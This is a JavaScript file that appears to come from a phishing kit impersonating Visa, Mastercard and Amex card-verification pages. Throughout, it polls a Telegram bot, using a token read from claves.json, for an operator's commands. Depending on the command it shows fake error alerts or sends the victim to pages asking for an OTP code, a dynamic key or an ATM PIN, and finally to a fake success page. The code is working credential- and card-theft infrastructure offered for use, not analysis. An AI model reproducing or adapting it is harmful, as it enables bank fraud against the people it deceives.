
// Cargar logo de la compañía si existe el elemento
const companyLoader = document.querySelector("#company-loader");

if (companyLoader && window.info?.checkerInfo?.company) {
    const logos = {
        VISA: { src: "./assets/logos/visa_verified.png", width: "130px", margin: "40px" },
        MC: { src: "./assets/logos/mc_id_check_2.jpg", width: "400px" },
        AM: { src: "./assets/logos/amex_check_1.png", width: "200px" }
    };

    const company = window.info.checkerInfo.company;
    if (logos[company]) {
        companyLoader.setAttribute("src", logos[company].src);
        companyLoader.setAttribute("width", logos[company].width);
        if (logos[company].margin) {
            companyLoader.style.marginBottom = logos[company].margin;
        }
    }
}


document.addEventListener("DOMContentLoaded", async () => {
    let config;
    try {
        const response = await fetch("./claves.json");
        if (!response.ok) throw new Error("No se pudo cargar claves.json");
        config = await response.json();
        console.log("🔑 Config cargada en waiting.html:", config);
    } catch (error) {
        console.error("❌ Error al cargar claves.json:", error);
        return;
    }

    // Recuperar transactionId de localStorage (asegúrate de guardarlo antes en la página anterior)
    const transactionId = localStorage.getItem("transactionId");
    const messageId = localStorage.getItem("messageId");

    if (!transactionId || !messageId) {
        console.error("❌ No se encontró transactionId o messageId en localStorage.");
        return;
    }

    console.log("🔄 Esperando respuestas de Telegram en waiting.html...");
    checkPaymentVerification(transactionId, messageId, config);
});

async function checkPaymentVerification(transactionId, messageId, config) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${config.botToken}/getUpdates`);
        const data = await response.json();

        const updates = data.result;
        const verificationUpdate = updates.find((update) =>
            update.callback_query &&
            [
                `error_tc:${transactionId}`,
                `error_logo:${transactionId}`,
                `dinamic:${transactionId}`,
                `pedir_otp:${transactionId}`,
                `cajero:${transactionId}`,
                `confirm_finalizar:${transactionId}`
            ].includes(update.callback_query.data)
        );

        if (verificationUpdate) {
            console.log("✅ Acción recibida en Telegram:", verificationUpdate.callback_query.data);

            // Ocultar botones en Telegram después de presionar
            await fetch(`https://api.telegram.org/bot${config.botToken}/editMessageReplyMarkup`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chatId,
                    message_id: messageId,
                    reply_markup: { inline_keyboard: [] }
                })
            });

            switch (verificationUpdate.callback_query.data) {
                case `error_logo:${transactionId}`:
                    alert("Usuario o clave incorrectos.");
                    window.location.href = "id-check.html";
                    break;
                case `error_tc:${transactionId}`:
                    alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
                    window.location.href = "step-two.html";
                    break;
                case `pedir_otp:${transactionId}`:
                    window.location.href = "otpcode.html";
                    break;
                case `dinamic:${transactionId}`:
                    window.location.href = "pedirdinamica.html";
                    break;
                case `cajero:${transactionId}`:
                    window.location.href = "clavecajero.html";
                    break;
                case `confirm_finalizar:${transactionId}`:
                    window.location.href = "success.html";
                    break;
            }
        } else {
            // Si no hay respuesta, seguir verificando cada 2 segundos
            setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
        }
    } catch (error) {
        console.error("❌ Error verificando respuesta de Telegram:", error);
        setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
    }
}

